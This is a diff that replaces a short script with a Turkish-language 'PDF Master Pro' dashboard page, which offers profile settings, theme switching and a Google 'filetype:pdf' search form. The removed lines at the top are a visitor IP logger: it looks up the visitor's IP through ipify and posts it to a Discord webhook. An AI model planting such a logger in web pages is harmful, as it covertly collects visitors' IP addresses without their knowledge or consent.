@@ -1,19 +1,534 @@
-<script>
-function getIP(json) {
-  var request = new XMLHttpRequest(); //making a request for the webhook
-      request.open("POST", "YOUR DISCORD WEBHOOK LINK HERE");
+<!DOCTYPE html>
+<html lang="tr" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Master Pro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root[data-theme="dark"] {
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-primary: #6366f1;
+            --accent-secondary: #4f46e5;
+            --border-color: rgba(99, 102, 241, 0.2);
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --nav-bg: rgba(15, 23, 42, 0.9);
+            --success: #22c55e;
+            --error: #ef4444;
+        }
 
-      request.setRequestHeader('Content-type', 'application/json');
+        :root[data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f1f5f9;
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --accent-primary: #4f46e5;
+            --accent-secondary: #4338ca;
+            --border-color: rgba(79, 70, 229, 0.2);
+            --card-bg: rgba(255, 255, 255, 0.9);
+            --nav-bg: rgba(255, 255, 255, 0.9);
+            --success: #16a34a;
+            --error: #dc2626;
+        }
 
-      var params = {
-        username: "Logger",
-        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
-        content: "**IP:** *" + json.ip + "*"
-      }
-   //just a webhook parameters such as avatar,name,message
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            transition: background-color 0.3s, color 0.3s;
+        }
 
-      request.send(JSON.stringify(params));
-    }
+        body {
+            min-height: 100vh;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
 
-</script>
-<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //using this api to get the ip
+        .navbar {
+            background: var(--nav-bg);
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--accent-primary);
+            text-decoration: none;
+        }
+
+        .logo i {
+            font-size: 1.75rem;
+        }
+
+        .main-container {
+            display: flex;
+            margin-top: 4rem;
+        }
+
+        .sidebar {
+            width: 280px;
+            height: calc(100vh - 4rem);
+            background: var(--bg-secondary);
+            position: fixed;
+            padding: 2rem 1rem;
+            border-right: 1px solid var(--border-color);
+        }
+
+        .profile-section {
+            text-align: center;
+            padding: 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 1.5rem;
+        }
+
+        .profile-image {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 1rem;
+            position: relative;
+            background: var(--accent-primary);
+            overflow: hidden;
+        }
+
+        .profile-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .profile-image .upload-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 0.5rem;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .profile-image:hover .upload-overlay {
+            opacity: 1;
+        }
+
+        .profile-name {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .profile-email {
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+        }
+
+        .menu-items {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .menu-item {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .menu-item:hover {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        .menu-item.active {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        .main-content {
+            margin-left: 280px;
+            padding: 2rem;
+            flex: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 1rem;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+
+        .search-form {
+            display: grid;
+            gap: 1.5rem;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .form-label {
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .form-input {
+            padding: 0.75rem 1rem;
+            border: 2px solid var(--border-color);
+            border-radius: 0.5rem;
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px var(--border-color);
+        }
+
+        .btn {
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-secondary);
+            transform: translateY(-2px);
+        }
+
+        .btn-danger {
+            background: var(--error);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: var(--error);
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 2rem;
+            padding: 0.5rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .theme-toggle i {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+                transition: transform 0.3s;
+            }
+
+            .sidebar.active {
+                transform: translateX(0);
+            }
+
+            .main-content {
+                margin-left: 0;
+            }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(100%); opacity: 0; }
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--success);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: slideIn 0.3s ease forwards;
+            z-index: 1000;
+        }
+
+        .toast-error {
+            background: var(--error);
+        }
+
+        .toast-hide {
+            animation: slideOut 0.3s ease forwards;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <a href="#" class="logo">
+            <i class="fas fa-book"></i>
+            PDF Master Pro
+        </a>
+        <div class="theme-toggle" onclick="toggleTheme()">
+            <i class="fas fa-sun"></i>
+            <i class="fas fa-moon"></i>
+        </div>
+    </nav>
+
+    <div class="main-container">
+        <aside class="sidebar">
+            <div class="profile-section">
+                <div class="profile-image">
+                    <img id="profileImg" src="https://via.placeholder.com/120" alt="Profile">
+                    <div class="upload-overlay" onclick="document.getElementById('imageUpload').click()">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <input type="file" id="imageUpload" hidden accept="image/*" onchange="updateProfileImage(this)">
+                </div>
+                <h3 class="profile-name" id="profileName">John Doe</h3>
+                <p class="profile-email" id="profileEmail">john@example.com</p>
+            </div>
+
+            <div class="menu-items">
+                <div class="menu-item active" onclick="showSection('search')">
+                    <i class="fas fa-search"></i>
+                    PDF Ara
+                </div>
+                <div class="menu-item" onclick="showSection('profile')">
+                    <i class="fas fa-user"></i>
+                    Profil
+                </div>
+                <div class="menu-item" onclick="showSection('settings')">
+                    <i class="fas fa-cog"></i>
+                    Ayarlar
+                </div>
+                <div class="menu-item" onclick="logout()">
+                    <i class="fas fa-sign-out-alt"></i>
+                    Çıkış Yap
+                </div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <section id="search-section" class="fade-in">
+                <div class="card">
+                    <h2 style="margin-bottom: 2rem; color: var(--accent-primary);">
+                        <i class="fas fa-search"></i> PDF Ara
+                    </h2>
+                    <form class="search-form" id="searchForm">
+                        <div class="form-group">
+                            <label class="form-label">Kitap Adı</label>
+                            <input type="text" class="form-input" placeholder="Aramak istediğiniz kitabın adını yazın...">
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Yazar</label>
+                            <input type="text" class="form-input" placeholder="Yazar adını yazın...">
+                        </div>
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-search"></i>
+                            Ara
+                        </button>
+                    </form>
+                </div>
+            </section>
+
+            <section id="profile-section" class="fade-in" style="display: none;">
+                <div class="card">
+                    <h2 style="margin-bottom: 2rem; color: var(--accent-primary);">
+                        <i class="fas fa-user"></i> Profil Bilgileri
+                    </h2>
+                    <form class="search-form">
+                        <div class="form-group">
+                            <label class="form-label">Ad Soyad</label>
+                            <input type="text" class="form-input" id="nameInput">
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">E-posta</label>
+                            <input type="email" class="form-input" id="emailInput">
+                        </div>
+                        <button type="button" class="btn btn-primary" onclick="updateProfile()">
+                            <i class="fas fa-save"></i>
+                            Kaydet
+                        </button>
+                    </form>
+                </div>
+            </section>
+
+            <section id="settings-section" class="fade-in" style="display: none;">
+                <div class="card">
+                    <h2 style="margin-bottom: 2rem; color: var(--accent-primary);">
+                        <i class="fas fa-cog"></i> Ayarlar
+                    </h2>
+                    <div class="form-group">
+                        <label class="form-label">Tema</label>
+                        <button class="btn btn-primary" onclick="toggleTheme()">
+                            <i class="fas fa-adjust"></i>
+                            Tema Değiştir
+                        </button>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            const html = document.documentElement;
+            const currentTheme = html.getAttribute('data-theme');
+            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            html.setAttribute('data-theme', newTheme);
+            localStorage.setItem('theme', newTheme);
+        }
+
+        function updateProfileImage(input) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('profileImg').src = e.target.result;
+                    localStorage.setItem('profileImage', e.target.result);
+                };
+                reader.readAsDataURL(input.files[0]);
+            }
+        }
+
+        function showSection(sectionId) {
+            document.querySelectorAll('section').forEach(section => {
+                section.style.display = 'none';
+            });
+            document.getElementById(`${sectionId}-section`).style.display = 'block';
+            
+            document.querySelectorAll('.menu-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+        }
+
+        function updateProfile() {
+            const name = document.getElementById('nameInput').value;
+            const email = document.getElementById('emailInput').value;
+            
+            const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+            currentUser.name = name;
+            currentUser.email = email;
+            
+            localStorage.setItem('currentUser', JSON.stringify(currentUser));
+            
+            document.getElementById('profileName').textContent = name;
+            document.getElementById('profileEmail').textContent = email;
+            
+            showToast('Profil başarıyla güncellendi!');
+        }
+
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type === 'error' ? 'toast-error' : ''}`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('toast-hide');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        function logout() {
+            localStorage.removeItem('currentUser');
+            window.location.href = 'login.html';
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+            document.documentElement.setAttribute('data-theme', savedTheme);
+
+            const savedImage = localStorage.getItem('profileImage');
+            if (savedImage) {
+                document.getElementById('profileImg').src = savedImage;
+            }
+
+            const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+            if (!currentUser) {
+                window.location.href = 'login.html';
+            } else {
+                document.getElementById('profileName').textContent = currentUser.name;
+                document.getElementById('profileEmail').textContent = currentUser.email;
+                document.getElementById('nameInput').value = currentUser.name;
+                document.getElementById('emailInput').value = currentUser.email;
+            }
+
+            document.getElementById('searchForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const inputs = e.target.querySelectorAll('.form-input');
+                const searchQuery = Array.from(inputs)
+                    .map(input => input.value.trim())
+                    .filter(Boolean)
+                    .join(' ') + ' filetype:pdf';
+
+                if (searchQuery) {
+                    window.open(`https://www.google.com/search?q=${encodeURIComponent(searchQuery)}`, '_blank');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
